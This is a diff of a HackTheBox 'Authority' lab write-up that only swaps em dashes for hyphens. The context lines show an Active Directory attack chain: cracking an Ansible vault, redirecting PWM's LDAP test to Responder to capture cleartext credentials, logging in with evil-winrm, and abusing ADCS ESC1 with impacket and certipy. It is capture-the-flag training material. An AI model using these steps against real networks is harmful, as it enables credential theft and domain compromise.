@@ -1,5 +1,5 @@
 
-# HackTheBox — Authority
+# HackTheBox - Authority
 
 **Difficulty:** Medium | **OS:** Windows
 
@@ -28,7 +28,7 @@ SMB Null Auth → Ansible Vault (ansible2john + crack)
 rustscan -a 10.129.229.56 -u 5000 -b 2000 -- -sCV
 ```
 
-Full port sweep confirms a Windows Domain Controller with a broad attack surface — notably LDAP, Kerberos, WinRM, SMB, and an HTTPS service on port 8443.
+Full port sweep confirms a Windows Domain Controller with a broad attack surface - notably LDAP, Kerberos, WinRM, SMB, and an HTTPS service on port 8443.
 
 ### Clock Skew & Host Setup
 
@@ -39,7 +39,7 @@ ntpdate -u 10.129.229.56
 echo "10.129.229.56 authority.htb authority.authority.htb " | sudo tee -a /etc/hosts
 ```
 
-### Web Enumeration — Port 8443
+### Web Enumeration - Port 8443
 
 Port 8443 hosts a **PWM** (Password Management Web Application) login panel.
 
@@ -70,12 +70,12 @@ ansible_port: 5985
 <img width="419" height="143" alt="Pasted image 20260524052628" src="https://github.com/user-attachments/assets/b2bf613e-d7aa-4b1d-a791-4125f9f1a51d" />
 
 
-These credentials did not authenticate against any service — likely stale or scoped to a different context. Continued enumeration of the share surfaces a `main.yml` file containing Ansible Vault encrypted blobs.
+These credentials did not authenticate against any service - likely stale or scoped to a different context. Continued enumeration of the share surfaces a `main.yml` file containing Ansible Vault encrypted blobs.
 
 <img width="800" height="616" alt="Pasted image 20260524052712" src="https://github.com/user-attachments/assets/e467b8f4-05b1-4dc5-b7ce-3d768c2fac9a" />
 
 
-### Ansible Vault — Hash Extraction & Cracking
+### Ansible Vault - Hash Extraction & Cracking
 
 The `admin_login` file serves as the vault password file (encrypted). Convert it to a crackable format:
 
@@ -108,11 +108,11 @@ ansible-vault decrypt ldap_admin_password.hash --vault-password-file <(echo '!@#
 
 ---
 
-## PWM Abuse — LDAP Credential Capture
+## PWM Abuse - LDAP Credential Capture
 
 ### Authenticate to PWM
 
-Using the `svc_pwm` credentials on the PWM web interface at `https://authority.htb:8443` — login successful.
+Using the `svc_pwm` credentials on the PWM web interface at `https://authority.htb:8443` - login successful.
 
 ### Config Editor → Responder Capture
 
@@ -131,7 +131,7 @@ responder -I tun0 --lm
 ldap://<your_tun0_ip>:389
 ```
 
-4. Click **Test LDAP Profile** — PWM attempts to bind to the spoofed LDAP server and sends credentials in cleartext to Responder.
+4. Click **Test LDAP Profile** - PWM attempts to bind to the spoofed LDAP server and sends credentials in cleartext to Responder.
 
 <img width="1054" height="646" alt="Pasted image 20260524052815" src="https://github.com/user-attachments/assets/7cd0798d-3dc1-43f8-b107-6e50feacccc0" />
 
@@ -162,11 +162,11 @@ evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
 
 ---
 
-## Privilege Escalation — ADCS ESC1
+## Privilege Escalation - ADCS ESC1
 
 ### Certificate Enumeration
 
-Navigating `C:\` reveals a `Certificates` share — consistent with the SMB enumeration at the start. Run a certipy scan:
+Navigating `C:\` reveals a `Certificates` share - consistent with the SMB enumeration at the start. Run a certipy scan:
 
 ```bash
 certipy-ad find \
@@ -185,7 +185,7 @@ The `CorpVPN` template is vulnerable to **ESC1** (enrollee-supplied Subject Alte
 
 ### Add a Fake Computer Account
 
-`svc_ldap` is a service account, not a computer — enrollment requires a machine account. Add one via impacket:
+`svc_ldap` is a service account, not a computer - enrollment requires a machine account. Add one via impacket:
 
 ```bash
 impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' \
@@ -260,4 +260,4 @@ Shell obtained as `AUTHORITY\Administrator`.
 
 ---
 
-_Writeup by ctxzero — HackTheBox: Authority_
+_Writeup by ctxzero - HackTheBox: Authority_
